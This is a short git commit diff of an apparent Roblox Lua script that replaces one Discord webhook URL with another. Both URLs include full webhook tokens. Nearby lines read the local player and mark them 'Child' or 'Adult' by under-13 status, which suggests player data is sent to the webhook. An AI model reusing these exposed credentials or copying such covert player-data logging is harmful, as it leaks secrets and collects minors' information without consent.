c6379e1210cce615b1dba9b7c856d35c7590cef9
T1m12 <99375378+T1m12@users.noreply.github.com>
2023-04-09 21:50:12 +0700

    Update 732931.lua

--- 732931.lua
+++ 732931.lua
@@ -1,4 +1,4 @@
-local Webhook = "https://discord.com/api/webhooks/1094300990360006666/FRWJ34wjRrlQ9G3FKOUz-xVHMPQUcYd4U5Ol0F5vv7aSOno_I4m6X5-aCHlfckTzfctp"
+local Webhook = "https://discord.com/api/webhooks/1094635151427911700/Pvr2wWB5pS4A0Nn7PttIAnvqaKTh5WuC6vBoji5WdJ2dt6su4FAbHoku0UeyBKPeE_pi"
 local Headers = {["content-type"] = "application/json"} 
 local player = game.Players.LocalPlayer
 local profile = player:GetUnder13() and "Child" or "Adult"
